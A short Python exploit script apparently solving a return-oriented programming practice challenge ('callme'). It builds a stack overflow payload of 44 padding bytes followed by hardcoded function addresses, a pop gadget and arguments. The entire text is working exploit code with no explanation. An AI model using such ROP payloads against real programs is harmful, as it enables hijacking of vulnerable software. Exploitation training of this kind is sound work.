payload = "A"*44

pop = "\xa9\x88\x04\x08"

arg1 = "\x01\x00\x00\x00"
arg2 = "\x02\x00\x00\x00"
arg3 = "\x03\x00\x00\x00"

callme_one = "\xc0\x85\x04\x08"
callme_two = "\x20\x86\x04\x08"
callme_three = "\xb0\x85\x04\x08"

print(payload+callme_one+pop+arg1+arg2+arg3+callme_two+pop+arg1+arg2+arg3+callme_three+pop+arg1+arg2+arg3)

